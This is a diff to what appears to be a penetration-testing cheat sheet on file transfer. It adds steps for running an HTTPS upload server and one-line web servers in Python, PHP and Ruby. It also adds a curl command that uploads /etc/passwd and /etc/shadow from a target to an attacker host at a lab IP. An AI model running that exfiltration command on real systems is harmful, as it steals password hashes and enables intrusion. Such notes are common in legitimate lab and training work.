@@ -228,11 +228,26 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 
 ## Upload
 
+### Web (443)
 
 ```bash
 # create cert
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 # create a new dir
 mkdir https && cd https
-uv run --with uploadserver python -m uploadserver 443 --server-certificate ~/server.pem
+uv run --with uploadserver python -m uploadserver 443 --server-certificate ../server.pem
+
+# Upload files
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
+
+### Web Servers
+
+```bash
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+php -S 0.0.0.0:8000
+ruby -run -ehttpd . -p8000
+
+```
+
